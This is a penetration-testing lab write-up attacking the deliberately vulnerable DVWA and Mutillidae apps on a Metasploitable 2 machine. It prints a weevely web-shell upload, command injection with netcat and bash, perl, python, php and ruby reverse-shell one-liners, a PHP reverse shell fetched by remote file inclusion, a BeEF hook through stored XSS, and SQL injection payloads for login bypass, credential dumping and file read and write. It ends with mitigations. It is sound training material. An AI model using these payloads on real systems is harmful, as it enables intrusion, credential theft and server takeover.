# Challenge 04: Penetration Testing Common Web Vulnerabilities

## Scenario
A Metasploitable 2 instance is hosting a vulnerable web application (DVWA). Your task is to perform a comprehensive penetration test on this web application, covering information gathering and the exploitation of various common web vulnerabilities to understand the potential risks and impact.

---

## Objective
- Perform information gathering to identify potential entry points.
- Exploit common web vulnerabilities like File Upload, Code Execution, LFI, and RFI.
- Understand the impact and risks associated with these vulnerabilities.
- Enhance skills in identifying and exploiting weaknesses in web applications.

---

## Disclaimer

**Important:** Only perform these tests on systems you own or have explicit permission to test. Unauthorized access or attacks are illegal and unethical. This lab environment is designed for educational purposes only.

---

## Environment

### Attacker
- **OS:** Kali Linux
- **IP Address:** 192.168.1.144

### Target Web Application
- **OS:** Metasploitable 2 (Purposefully Vulnerable Linux VM)
- **IP Address:** 192.168.1.60
- **Hostname:** msf2.shad.local
- **Vulnerable Application:**
    - Damn Vulnerable Web Application (DVWA) - Accessible at `http://msf2.shad.local/dvwa` (Security Level: Low)
    - Mutillidae - Accessible at `http://msf2.shad.local/mutillidae/` (Security Level: 0 (Hosed), For SQL Injection testing)

---

## Tools Used
- `knockpy`
- `dirb`
- `weevely`
- `netcat`
- `beef xss`
- `sqlmap`

---

## Attack Overview
1.  **Phase 1: Information Gathering:** Conduct reconnaissance to identify potential entry points and vulnerabilities.
2.  **Phase 2: Exploiting Web Vulnerabilities:** Actively exploit various web application weaknesses such as file upload, command injection, file inclusion, and Cross-Site Scripting (XSS).
3.  **Phase 3: Advanced Web Vulnerabilities:** Explore advanced web application attacks like SQL Injection.

---
## Steps to Reproduce

### Phase 1: Information Gathering

The initial phase involves gathering as much information as possible about the target web application and server.

#### Step 1: External Reconnaissance
Utilize online tools to gather passive information about the target domain and IP address.
- **Websites:**
    - [Netcraft Site Report](https://sitereport.netcraft.com/)
    - [Robtex](https://robtex.com/)
- **Information to Collect:**
    - Domain ownership details
    - Associated IP addresses
    - Technologies used (e.g., web server, operating system, programming languages)
    - Other hosts sharing the same IP address
    - DNS records

#### Step 2: Subdomain Discovery
Identify potential subdomains associated with the target domain.
- **Tool:** `knockpy`
- **Command:**
    ```bash
    knockpy --domain target-domain.com --recon
    ```
    *(Replace `target-domain.com` with the actual domain)*

#### Step 3: Directory Brute-Forcing
Discover hidden directories and files on the web server.
- **Tool:** `dirb`
- **Command:**
    ```bash
    dirb http://msf2.shad.local
    ```

### Phase 2: Exploiting Web Vulnerabilities

This phase focuses on actively exploiting identified vulnerabilities within the DVWA application. Ensure DVWA security is set to "low" for these exercises.

-   **Target Application:** DVWA (Accessible at `http://msf2.shad.local/DVWA/`)
-   **Security Level:** Low

#### Step 1: File Upload Vulnerabilities
Exploit weaknesses in file upload functionalities to execute arbitrary code on the server.
- **Target Path:** `http://msf2.shad.local/dvwa/hackable/uploads`
- **Scenario:** The application allows the upload of executable files (e.g., PHP scripts).

1.  **Generate PHP Payload (Weevely):**
    - Based on information gathering, assume the system uses PHP.
    - Generate a PHP web shell using `weevely` (version 3.7 recommended for older systems like Metasploitable 2).
    - **Command:**
        ```bash
        cd /opt/weevely3/usr/share/weevely
        python2 /opt/weevely3/usr/share/weevely/weevely.py generate <password> /home/shad/payload.php
        ```
        *(Replace `<password>` with a strong password for your web shell.)*
        *Note: The path `/opt/weevely3/usr/share/weevely` assumes weevely is installed from source or a specific package. Adjust as necessary.*

2.  **Upload the Payload:**
    - Navigate to the DVWA File Upload page (`http://msf2.shad.local/dvwa/vulnerabilities/upload/`).
    - Upload your generated `payload.php` file.

3.  **Interact with the Web Shell:**
    - Once uploaded, access and interact with your web shell.
    - **Command:**
        ```bash
        python2 /opt/weevely3/usr/share/weevely/weevely.py http://msf2.shad.local/dvwa/hackable/uploads/payload.php <password>
        ```
        *(Replace `<password>` with the password you used during generation.)*

![File Upload Vulnerability Output Placeholder](/images/file_upload_output.png)

#### Step 2: Code Execution Vulnerabilities
Execute operating system commands directly on the server through vulnerable input fields.
- **Target Path:** `http://msf2.shad.local/dvwa/vulnerabilities/exec`
- **Scenario:** The application likely uses a command like `ping <user_input>` on the backend. You can inject additional commands using command separators like `;`.

1.  **Set up Netcat Listener (Attacker Machine):**
    - Open a terminal on your Kali Linux machine.
    - **Command:**
        ```bash
        nc -vv -l -p 8080
        ```

2.  **Spawn a Netcat Reverse Shell (Target Application):**
    - In the text field of the DVWA Code Execution page, enter a command to establish a reverse shell connection to your listener.
    - **Example Command:**
        ```bash
        8.8.8.8;nc -e /bin/sh 192.168.1.144 8080
        ```
        *(Replace `192.168.1.144` with your Kali Linux IP address.)*
    - **Expected Outcome:** You should receive a shell connection on your Netcat listener.

3.  **Alternative Reverse Shell Commands:**
    - **BASH:**
        ```bash
        bash -i >& /dev/tcp/192.168.1.144/8080 0>&1
        ```
    - **PERL:**
        ```perl
        perl -e 'use Socket;$i="192.168.1.144";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
        ```
    - **Python:**
        ```python
        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.144",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
        ```
    - **PHP:**
        ```php
        php -r '$sock=fsockopen("192.168.1.144",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
        ```
    - **Ruby:**
        ```ruby
        ruby -rsocket -e'f=TCPSocket.open("192.168.1.144",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
        ```
    *(Remember to replace `192.168.1.144` with your Kali Linux IP address in these commands.)*

![Code Execution Vulnerability Output Placeholder](/images/code_execution_output.png)

#### Step 3: Local File Inclusion (LFI) Vulnerabilities
Read arbitrary files on the target server by exploiting file inclusion vulnerabilities.
- **Target Path:** `http://msf2.shad.local/dvwa/vulnerabilities/fi/?page=include.php`
- **Scenario:** The application includes a file based on user input, without proper validation. This can be exploited using directory traversal (`../`) to access files outside the intended web directory.

1.  **Modify the URL:**
    - Change the `page` parameter in the URL to point to a sensitive file on the server.
    - **Example URL:**
        ```
        http://msf2.shad.local/dvwa/vulnerabilities/fi/?page=/../../../../../etc/passwd
        ```
    - **Expected Outcome:** The contents of the `/etc/passwd` file from the Metasploitable 2 server should be displayed in your browser.

![LFI Vulnerability Output Placeholder](/images/lfi_output.png)

#### Step 4: Remote File Inclusion (RFI) Vulnerabilities
Include and execute files hosted on an external server (your attacker machine) by exploiting file inclusion vulnerabilities.
- **Target Path:** `http://msf2.shad.local/dvwa/vulnerabilities/fi/?page=include.php`
- **Scenario:** Similar to LFI, but the application allows including files from remote URLs.

1.  **Prepare Remote Payload:**
    - Ensure the `reverse.txt` file (your PHP reverse shell payload) is accessible via a web server on your Kali Linux machine.
    - The file `reverse.txt` contains:
        ```php
        <?php
        passthru("nc -e /bin/sh 192.168.1.144 8080");
        ?>
        ```
        *(Remember to replace `192.168.1.144` with your Kali Linux IP address.)*

2.  **Start Apache2 Web Server (Attacker Machine):**
    - Move `reverse.txt` to the web root (`/var/www/html`).
    - **Command:**
        ```bash
        systemctl start apache2
        mv reverse.txt /var/www/html/
        ```

3.  **Launch Netcat Listener (Attacker Machine):**
    - **Command:**
        ```bash
        nc -vv -l -p 8080
        ```

4.  **Modify Target URL (Target Application):**
    - Change the `page` parameter in the DVWA URL to point to your hosted `reverse.txt` file.
    - **Example URL:**
        ```
        http://msf2.shad.local/dvwa/vulnerabilities/fi/?page=http://192.168.1.144/reverse.txt?
        ```
        *(Replace `192.168.1.144` with your Kali Linux IP address.)*
    - **Expected Outcome:** You should gain a shell connection back to your Netcat listener on the Kali Linux machine.

![RFI Vulnerability Output Placeholder](/images/rfi_output.png)

#### Step 5: Cross-Site Scripting (XSS) Vulnerabilities (To Be Documented)
Cross-Site Scripting (XSS) vulnerabilities allow attackers to inject malicious client-side scripts into web pages viewed by other users. This can lead to session hijacking, website defacement, or redirection to malicious sites. We will explore two types: Reflected XSS and Stored XSS.

##### 5.1 Reflected XSS
- **Target Path:** `http://msf2.shad.local/dvwa/vulnerabilities/xss_r/`
- **Scenario:** The web application reflects user-supplied input directly into the HTML response without proper sanitization.

1.  **Discovering Reflected XSS:**
    - Navigate to the target path.
    - In the input field, enter the following JavaScript payload:
        ```html
        <script>alert("Test XSS")</script>
        ```
    - ![Inputting the XSS payload](/images/xss-reflected-input.png)
    - Observe if an alert box pops up, indicating successful script execution.
    - You can also test this by directly modifying the URL parameter:
        ```
        http://msf2.shad.local/dvwa/vulnerabilities/xss_r/?name=<script>alert("Test XSS")</script>
        ```
    - **Expected Outcome:** An alert box displaying "Test XSS" should appear in the browser.
    - ![Alert box demonstrating XSS execution](/images/xss-reflected-output.png)

##### 5.2 Stored XSS
- **Target Path:** `http://msf2.shad.local/dvwa/vulnerabilities/xss_s/`
- **Scenario:** The web application stores user-supplied input (e.g., in a comment or guestbook entry) without proper sanitization. The malicious script is then served to any user who views the page, executing in their browser.

1.  **Discovering Stored XSS:**
    - Navigate to the target path.
    - In an input field (like a guestbook message), enter the following JavaScript payload:
        ```html
        <script>alert("Test XSS")</script>
        ```
    - Submit the form.
    - ![Inputting the Stored XSS payload](/images/xss-stored-input.png)
    - Refresh the page or navigate away and back to it.
    - **Expected Outcome:** The alert box displaying "Test XSS" should appear every time the page loads, as the script is now stored in the database and served to all visitors.
    - ![Alert box demonstrating Stored XSS execution](/images/xss-stored-output.png)

2.  **Exploiting with BeEF (Browser Exploitation Framework):**
    - Stored XSS can be used to load external JavaScript, such as a BeEF hook.
    - Start the BeEF framework on your Kali Linux machine.
    - If the input field has a character limit that prevents the full payload, use your browser's developer tools (Inspect Element) to modify the `maxlength` attribute of the input field to a higher value (e.g., 500).
    - ![Modifying input field character limit](/images/xss-stored-modify-limit.png)
    - In the vulnerable input field, submit the BeEF hook script as your payload:
        ```html
        <script src="http://192.168.1.144:3000/hook.js"></script>
        ```
        *(Remember to replace `192.168.1.144` with your Kali Linux IP)*
    - **Expected Outcome:** Every user (including yourself) who now visits the page will be hooked into your BeEF control panel, as their browser will load and execute the stored script. The target's browser will appear as a "hooked browser" in your BeEF interface, allowing for further client-side exploitation.
    - ![Hooked browser in BeEF from Stored XSS](/images/xss-stored-beef-hook.png)

### Phase 3: Advanced Web Vulnerabilities

#### Step 6: SQL Injection (SQLi) Vulnerabilities
SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It can be used to bypass authentication, extract sensitive data, or even write files to the server. We will test these vulnerabilities on the Mutillidae application.

-   **Target Application:** Mutillidae (Accessible at `http://msf2.shad.local/mutillidae/`)
-   **Security Level:** 0 (Hosed)

##### 6.1 Authentication Bypass via POST Request
-   **Target Path:** `http://msf2.shad.local/mutillidae/index.php?page=login.php`
-   **Scenario:** The application's login form takes a username and password via a POST request. The backend query is likely structured similarly to: `SELECT * FROM accounts WHERE username = '$USER' AND password = '$PASSWORD'`. By injecting a SQL payload, we can manipulate this query to always return true, thus bypassing authentication.

1.  **Understand the Vulnerable Query:**
    The assumed backend query is: `SELECT * FROM accounts WHERE username = '$USER' AND password = '$PASSWORD'`

2.  **Craft a Bypass Payload:**
    An effective payload for the password field would close the single quote, add an `OR` condition that is always true, and comment out the rest of the original query.
    -   **Payload for Password Field:** `34tv5y4' or 1=1#`
    -   This transforms the query into: `SELECT * FROM accounts WHERE username = 'admin' AND password = '34tv5y4' OR 1=1#'` (where `#` comments out the trailing single quote).

3.  **Perform the Injection:**
    -   Navigate to the Mutillidae login page.
    -   Enter `admin` in the "Name" field.
    -   Enter `34tv5y4' or 1=1#` in the "Password" field.
    -   Click "Login".

4.  **Expected Outcome:** You should successfully log in as `admin` without knowing the actual password.
    ![SQLi Authentication Bypass Screenshot Placeholder](/images/sqli_auth_bypass.png)

5.  **Alternative (Name field injection):**
    You can also attempt to inject into the username field.
    -   **Payload for Name Field:** `admin'#`
    -   **Password Field:** Any random text (e.g., `q324543`)
    -   This transforms the query into: `SELECT * FROM accounts WHERE username = 'admin'#' AND password = '$PASSWORD'`
    -   The `#` comments out the rest of the query, making the password check irrelevant.

##### 6.2 Data Exfiltration via GET Request (Union-Based SQLi)
-   **Target Path:** `http://msf2.shad.local/mutillidae/index.php?page=user-info.php`
-   **Scenario:** The application uses a GET parameter for `username` (and `password`), and the output of the query is displayed on the page. We can use `UNION SELECT` to combine our malicious query with the original query, exfiltrating data. The assumed backend query is: `SELECT * FROM accounts WHERE username = '$USER' AND password = '$PASSWORD'`.

1.  **Identify Number of Columns:**
    We need to determine the number of columns in the original query to make the `UNION SELECT` statement compatible. We can do this by using the `ORDER BY` clause and incrementing the column number until an error occurs.
    -   **URL Payload:** `admin' ORDER BY [N]#` (where `[N]` is the column number). The `#` is URL-encoded as `%23`.
    -   **Example (Attempting 6 columns):**
        `http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin%27%20ORDER%20BY%206%23&password=elvni53&user-info-php-submit-button=View+Account+Details`
    -   **Expected Outcome:** An error indicates that 6 columns is too many.
    ![SQLi Order By Error Screenshot Placeholder](/images/sqli_order_by_error.png)
    -   **Example (Attempting 5 columns):**
        `http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin%27%20ORDER%20BY%205%23&password=elvni53&user-info-php-submit-button=View+Account+Details`
    -   **Expected Outcome:** No error, confirming 5 columns.

2.  **Identify Displayed Columns:**
    Now that we know there are 5 columns, we can use `UNION SELECT 1,2,3,4,5` to see which columns are actually displayed on the page.
    -   **URL Payload:** `admin' UNION SELECT 1,2,3,4,5#`
    -   **Example URL:**
        `http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin%27%20UNION%20SELECT%201,2,3,4,5%23&password=elvni53&user-info-php-submit-button=View+Account+Details`
    -   **Expected Outcome:** The numbers `2`, `3`, and `4` will likely appear in the output, indicating these are displayed columns. (The exact numbers displayed depend on the application's rendering). From Mutillidae, typically Username is column 2, Password is column 3 and Signature is column 4.
    ![SQLi Union Select Columns Screenshot Placeholder](/images/sqli_union_cols.png)

3.  **Display Database Information:**
    Use the identified displayed columns to inject database-specific functions.
    -   **URL Payload:** `admin' UNION SELECT 1,database(),user(),version(),5#`
    -   **Example URL:**
        `http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin%27%20UNION%20SELECT%201,database(),user(),version(),5%23&password=elvni53&user-info-php-submit-button=View+Account+Details`
    -   **Expected Outcome:** The database name (`owasp10`), database user (`root`), and MySQL version (`5.0.51a-3ubuntu5`) should be displayed.
    ![SQLi Database Info Screenshot Placeholder](/images/sqli_db_info.png)

4.  **Discover Database Tables:**
    Query the `information_schema.tables` to list tables within the `owasp10` database.
    -   **URL Payload:** `admin' UNION SELECT 1,table_name,null,null,5 FROM information_schema.tables WHERE table_schema = 'owasp10'#`
    -   **Example URL:**
        `http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin%27%20UNION%20SELECT%201,table_name,null,null,5%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27owasp10%27%23&password=elvni53&user-info-php-submit-button=View+Account+Details`
    -   **Expected Outcome:** A list of table names within the `owasp10` database (e.g., `accounts`, `credit_cards`) will be displayed one by one.
    ![SQLi Discover Tables Screenshot Placeholder](/images/sqli_discover_tables.png)

5.  **Discover Column Names:**
    Query the `information_schema.columns` to list column names for a specific table (e.g., `accounts`).
    -   **URL Payload:** `admin' UNION SELECT 1,column_name,null,null,5 FROM information_schema.columns WHERE table_name = 'accounts'#`
    -   **Example URL:**
        `http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin%27%20UNION%20SELECT%201,column_name,null,null,5%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27accounts%27%23&password=elvni53&user-info-php-submit-button=View+Account+Details`
    -   **Expected Outcome:** A list of column names for the `accounts` table (e.g., `cid`, `username`, `password`, `mysignature`, `is_admin`) will be displayed.
    ![SQLi Discover Columns Screenshot Placeholder](/images/sqli_discover_cols.png)

6.  **Discover User and Admin Credentials:**
    Now that we know the table and column names, we can extract sensitive data directly.
    -   **URL Payload:** `admin' UNION SELECT 1,username,password,is_admin,5 FROM accounts#`
    -   **Example URL:**
        `http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin%27%20UNION%20SELECT%201,username,password,is_admin,5%20FROM%20accounts%23&password=elvni53&user-info-php-submit-button=View+Account+Details`
    -   **Expected Outcome:** Usernames, hashed passwords, and admin status from the `accounts` table will be displayed.
    ![SQLi Credentials Screenshot Placeholder](/images/sqli_credentials.png)

##### 6.3 Reading Files on the Server via SQLi
-   **Scenario:** If the database user has sufficient privileges, SQL injection can be leveraged to read arbitrary files from the server's file system using functions like `LOAD_FILE()`.

1.  **Read `/etc/passwd`:**
    -   **URL Payload:** `admin' UNION SELECT null,LOAD_FILE('/etc/passwd'),null,null,null#` (Using `null` for columns not actively being displayed or not needed).
    -   **Example URL:**
        `http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin%27%20UNION%20SELECT%20null,LOAD_FILE(%27/etc/passwd%27),null,null,null%23&password=elvni53&user-info-php-submit-button=View+Account+Details`
    -   **Expected Outcome:** The content of the `/etc/passwd` file will be displayed on the web page.
    ![SQLi Load File Screenshot Placeholder](/images/sqli_load_file.png)

##### 6.4 Writing Files to the Server via SQLi
-   **Scenario:** If the database user has write privileges to a directory, SQL injection can be used to write arbitrary files to the server's file system using `INTO OUTFILE` or `INTO DUMPFILE`.

1.  **Write a Simple File:**
    -   **URL Payload:** `admin' UNION SELECT null,'Upload Test',null,null,null INTO OUTFILE '/tmp/sqli-upload.txt'#`
    -   **Example URL:**
        `http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin%27%20UNION%20SELECT%20null,%27Upload%20Test%27,null,null,null%20INTO%20OUTFILE%20%27/tmp/sqli-upload.txt%27%23&password=elvni53&user-info-php-submit-button=View+Account+Details`
    -   **Expected Outcome:** The string "Upload Test" will be written to `/tmp/sqli-upload.txt` on the server. You can verify this by attempting to read the file with `LOAD_FILE()` or by gaining a shell and navigating to the `/tmp` directory.

##### 6.5 Automated SQL Injection with SQLMap
`sqlmap` is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.

1.  **Basic Help and Options:**
    -   **Command:** `sqlmap --help`
    -   **Expected Outcome:** Displays all available options and commands for `sqlmap`.

2.  **Discover SQLi Vulnerability:**
    Target the `user-info.php` page with its parameters to find SQL injection points.
    -   **Command:** `sqlmap -u "http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin&password=aaaa&user-info-php-submit-button=View+Account+Details"`
    -   **Expected Outcome:** `sqlmap` will identify the injectable parameters.

3.  **Enumerate Databases:**
    List all available databases on the target server.
    -   **Command:** `sqlmap -u "http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin&password=aaaa&user-info-php-submit-button=View+Account+Details" --dbs`
    -   **Expected Outcome:** `sqlmap` will list databases like `owasp10`, `information_schema`, etc.

4.  **Identify Current Database:**
    Determine the database currently in use by the application.
    -   **Command:** `sqlmap -u "http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin&password=aaaa&user-info-php-submit-button=View+Account+Details" --current-db`
    -   **Expected Outcome:** `sqlmap` will output the current database, likely `owasp10`.

5.  **Enumerate Tables in a Database:**
    List all tables within the `owasp10` database.
    -   **Command:** `sqlmap -u "http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin&password=aaaa&user-info-php-submit-button=View+Account+Details" --tables -D owasp10`
    -   **Expected Outcome:** `sqlmap` will list tables like `accounts`, `credit_cards`, etc.

6.  **Enumerate Columns in a Table:**
    List all columns within the `accounts` table in the `owasp10` database.
    -   **Command:** `sqlmap -u "http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin&password=aaaa&user-info-php-submit-button=View+Account+Details" --columns -T accounts -D owasp10`
    -   **Expected Outcome:** `sqlmap` will list columns like `cid`, `username`, `password`, `mysignature`, `is_admin`.

7.  **Dump Data from a Table:**
    Extract all data from the `accounts` table.
    -   **Command:** `sqlmap -u "http://msf2.shad.local/mutillidae/index.php?page=user-info.php&username=admin&password=aaaa&user-info-php-submit-button=View+Account+Details" --dump -T accounts -D owasp10`
    -   **Expected Outcome:** `sqlmap` will dump all entries, including usernames and passwords, from the `accounts` table.
---

## Results
- Successfully gained a remote shell on the target server through multiple vulnerabilities.
- Sensitive files, such as `/etc/passwd`, were read from the server.
- The web application's weaknesses allowed for arbitrary code execution.

---

## Impact
- **Complete Server Compromise:** RCE and file upload vulnerabilities can lead to a full server takeover.
- **Data Exfiltration:** LFI and SQLi can be used to steal sensitive data from the server and its database.
- **Platform for Further Attacks:** A compromised server can be used as a pivot point to attack other systems within the internal network.
- **Reputational Damage:** Defacement or data breaches can severely damage the organization's reputation.

---

## Mitigation & Defensive Measures

### User & Organizational
- **Secure Coding Practices:** Train developers to write secure code, avoiding common pitfalls that lead to these vulnerabilities.
- **Vulnerability Scanning:** Regularly scan web applications with dynamic (DAST) and static (SAST) analysis tools to identify vulnerabilities early.

### Technical Controls
- **Input Validation:** Rigorously validate and sanitize all user-supplied input to prevent injection attacks (SQLi, Command Injection).
- **File Upload Security:**
  - Whitelist allowed file extensions and types.
  - Scan uploaded files for malware.
  - Do not store uploaded files in a web-accessible directory with execute permissions.
- **File Inclusion:** Avoid including files based on user input. If necessary, use a strict whitelist of allowed files.
- **Web Application Firewall (WAF):** Deploy a WAF to detect and block common web attacks at the edge.
- **Principle of Least Privilege:** Run the web server and application with the minimum privileges necessary to function.

---

## Lessons Learned
- A single vulnerability can often be enough to compromise an entire server.
- Poor input validation is the root cause of many critical web application vulnerabilities.
- Defense-in-depth, combining secure coding, regular scanning, and network-level protection, is essential for web security.
- Setting security levels to "low" in controlled environments is useful for learning but does not reflect real-world hardening.
